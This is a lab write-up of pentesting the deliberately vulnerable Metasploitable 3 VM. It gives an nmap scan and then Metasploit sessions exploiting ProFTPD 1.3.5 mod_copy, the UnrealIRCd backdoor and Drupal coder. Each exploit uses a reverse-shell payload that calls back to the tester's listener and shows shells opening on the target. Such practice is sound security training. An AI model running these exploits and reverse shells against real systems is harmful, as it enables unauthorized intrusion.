# Metasploitbale 3 Machine pentesting 
<img width="775" height="500" alt="image" src="https://github.com/user-attachments/assets/faf3983c-558e-4580-90a0-4e0f57c3f5e8" />





# Nmap Scan 
cmd - nmap -sS -sV -sC -O -p- -T4 192.168.0.224
```
┌──(nimesh㉿kali)-[~]
└─$ nmap -sS -sV -sC -O -p- -T4 192.168.0.224  
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-12 16:59 +0530
Nmap scan report for 192.168.0.224
Host is up (0.0015s latency).
Not shown: 65524 filtered tcp ports (no-response)
PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         ProFTPD 1.3.5
22/tcp   open   ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 2b:2e:1f:a4:54:26:87:76:12:26:59:58:0d:da:3b:04 (DSA)
|   2048 c9:ac:70:ef:f8:de:8b:a3:a3:44:ab:3d:32:0a:5c:6a (RSA)
|   256 c0:49:cc:18:7b:27:a4:07:0d:2a:0d:bb:42:4c:36:17 (ECDSA)
|_  256 a0:76:f3:76:f8:f0:70:4d:09:ca:e1:10:fd:a9:cc:0a (ED25519)
80/tcp   open   http        Apache httpd 2.4.7
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2020-10-29 19:37  chat/
| -     2011-07-27 20:17  drupal/
| 1.7K  2020-10-29 19:37  payroll_app.php
| -     2013-04-08 12:06  phpmyadmin/
|_
445/tcp  open   netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
631/tcp  open   ipp         CUPS 1.7
|_http-server-header: CUPS/1.7 IPP/2.1
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|_  Potentially risky methods: PUT
|_http-title: Home - CUPS 1.7.2
3000/tcp closed ppp
3306/tcp open   mysql       MySQL (unauthorized)
3500/tcp open   http        WEBrick httpd 1.3.1 (Ruby 2.3.8 (2018-10-18))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: WEBrick/1.3.1 (Ruby/2.3.8/2018-10-18)
|_http-title: Ruby on Rails: Welcome aboard
6697/tcp open   irc         UnrealIRCd
8080/tcp open   http        Jetty 8.1.7.v20120910
|_http-server-header: Jetty(8.1.7.v20120910)
|_http-title: Error 404 - Not Found
8181/tcp closed intermapper
MAC Address: 08:00:27:40:41:62 (Oracle VirtualBox virtual NIC)
Aggressive OS guesses: Linux 3.2 - 4.14 (98%), Linux 3.8 - 3.16 (97%), Linux 3.13 (94%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (94%), Linux 4.10 (94%), Android 8 - 9 (Linux 3.18 - 4.4) (94%), Linux 3.2 - 3.16 (94%), Linux 3.10 - 4.11 (93%), Linux 3.13 - 4.4 (93%), Linux 3.13 - 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Hosts: 127.0.0.1, METASPLOITABLE3-UB1404, irc.TestIRC.net; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: metasploitable3-ub1404
|   NetBIOS computer name: METASPLOITABLE3-UB1404\x00
|   Domain name: \x00
|   FQDN: metasploitable3-ub1404
|_  System time: 2026-06-12T11:30:58+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2026-06-12T11:30:57
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 2s, median: -1s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 148.33 seconds
```

# Metasploit Exploitation
## Active reconnaissance, initial access and expolitation
FTP - 
ProFTPD 1.3.5 is an FTP server software that was found to have a critical vulnerability (CVE-2015-3306) allowing remote attackers to read and write arbitary files.
```
msf exploit(unix/ftp/proftpd_modcopy_exec) > options
Module options (exploit/unix/ftp/proftpd_modcopy_exec):
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       HTTP port (TCP)
   RPORT_FTP  21               yes       FTP port
   SITEPATH   /var/www/        yes       Absolute writable website path
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to the website
   TMPPATH    /tmp             yes       Absolute writable path
   VHOST                       no        HTTP server virtual host
Payload options (cmd/unix/reverse_netcat):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.145    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   ProFTPD 1.3.5
View the full module info with the info, or info -d command.

msf exploit(unix/ftp/proftpd_modcopy_exec) > set RHOSTS meta3
RHOSTS => meta3
msf exploit(unix/ftp/proftpd_modcopy_exec) > set SITEPATH /var/www/html
SITEPATH => /var/www/html
msf exploit(unix/ftp/proftpd_modcopy_exec) > exploit
[*] Started reverse TCP handler on 192.168.0.145:4444 
[*] 192.168.0.197:80 - 192.168.0.197:21 - Connected to FTP server
[*] 192.168.0.197:80 - 192.168.0.197:21 - Sending copy commands to FTP server
[*] 192.168.0.197:80 - Executing PHP payload /j5rRMj.php
[+] 192.168.0.197:80 - Deleted /var/www/html/j5rRMj.php
[*] Command shell session 2 opened (192.168.0.145:4444 -> 192.168.0.197:60463) at 2026-06-09 18:40:57 +0530
[*] Exploit completed.
msf exploit(unix/ftp/proftpd_modcopy_exec) > sessions
Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  2         shell cmd/unix               192.168.0.145:4444 -> 192.168.0.197:60463 (192.168.0.197)

msf exploit(unix/ftp/proftpd_modcopy_exec) > sessions -i 2
[*] Starting interaction with 2...

whoami
www-data
```
# IRC Exploitation 
```
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > options
Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   6667             yes       The target port (TCP)
Payload options (cmd/linux/http/x86/meterpreter/reverse_tcp):
   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   FETCH_COMMAND   CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE    false            yes       Attempt to delete the binary after execution
   FETCH_FILELESS  none             yes       Attempt to run payload without touching disk by using anonymous handles, requires Linux ≥3.17 (for Python variant also Python ≥3.8, tested shells are sh, bash, zsh) (Accepted: none, python3.8+, shell-search, shell)
   FETCH_SRVHOST                    no        Local IP to use for serving payload
   FETCH_SRVPORT   8080             yes       Local port to use for serving payload
   FETCH_URIPATH                    no        Local URI to use for serving payload
   LHOST                            yes       The listen address (an interface may be specified)
   LPORT           4444             yes       The listen port
   When FETCH_COMMAND is one of CURL,GET,WGET:
   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   FETCH_PIPE  false            yes       Host both the binary payload and the command so it can be piped directly to the shell.
   When FETCH_FILELESS is none:
   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_FILENAME      QFfanZGBis       no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_WRITABLE_DIR  ./               yes       Remote writable dir to store payload; cannot contain spaces
Exploit target:
   Id  Name
   --  ----
   0   Linux/Unix Command
View the full module info with the info, or info -d command.

msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS meta3
RHOSTS => meta3
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.0.145
LHOST => 192.168.0.145
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > set RPORT 6697
RPORT => 6697
msf exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit
[*] Started reverse TCP handler on 192.168.0.145:4444 
[*] 192.168.0.197:6697 - Running automatic check ("set AutoCheck false" to disable)
[*] 192.168.0.197:6697 - Connected to 192.168.0.197:6697
[*] 192.168.0.197:6697 - Trying to register a new IRC user: serita
[+] 192.168.0.197:6697 - The target appears to be vulnerable. UnrealIRCd detected after registration
[*] 192.168.0.197:6697 - Connected to 192.168.0.197:6697
[*] 192.168.0.197:6697 - Sending IRC backdoor command
[*] Sending stage (1062760 bytes) to 192.168.0.197
[*] Meterpreter session 1 opened (192.168.0.145:4444 -> 192.168.0.197:60503) at 2026-06-09 19:43:24 +0530

meterpreter > shell
Process 2487 created.
Channel 1 created.
whoami
boba_fett
```
Internet relay chat backdoor, for version 3.2.8.1 was famous

# Drupal exploitation
```
msf exploit(unix/webapp/drupal_coder_exec) > options

Module options (exploit/unix/webapp/drupal_coder_exec):
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The target URI of the Drupal installation
   VHOST                       no        HTTP server virtual host
Payload options (cmd/unix/reverse_bash):
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.145    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   Automatic
View the full module info with the info, or info -d command.

msf exploit(unix/webapp/drupal_coder_exec) > set TARGETURI /drupal/
TARGETURI => /drupal/
msf exploit(unix/webapp/drupal_coder_exec) > set RHOSTS meta3
RHOSTS => meta3
msf exploit(unix/webapp/drupal_coder_exec) > exploit
[*] Started reverse TCP handler on 192.168.0.145:4444 
[*] Cleaning up: [ -f coder_upgrade.run.php ] && find . \! -name coder_upgrade.run.php -delete
[*] Command shell session 1 opened (192.168.0.145:4444 -> 192.168.0.197:60547) at 2026-06-09 20:19:18 +0530

whoami
www-data
```
